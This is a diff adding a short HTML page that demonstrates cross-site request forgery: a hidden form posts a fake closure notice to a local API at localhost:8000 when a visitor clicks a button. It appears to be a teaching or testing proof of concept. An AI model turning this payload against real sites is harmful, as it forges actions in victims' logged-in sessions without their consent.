@@ -1,0 +1,19 @@
+<html>
+<body>
+  Click to get CSRF'ed!
+  <form name="csrf_form" action="https://localhost:8000/api/posts" method="POST">
+    <input type="hidden" name="text" value="Hey guys! We are closed this month">
+  </form>
+
+  <button id="csrf">Click me!</button>
+
+  <script type="text/javascript">
+    var button = document.querySelector('#csrf');
+    button.addEventListener('click', function() {
+      document.csrf_form.submit();
+    });
+  </script>
+</body>
+</html>
+
+
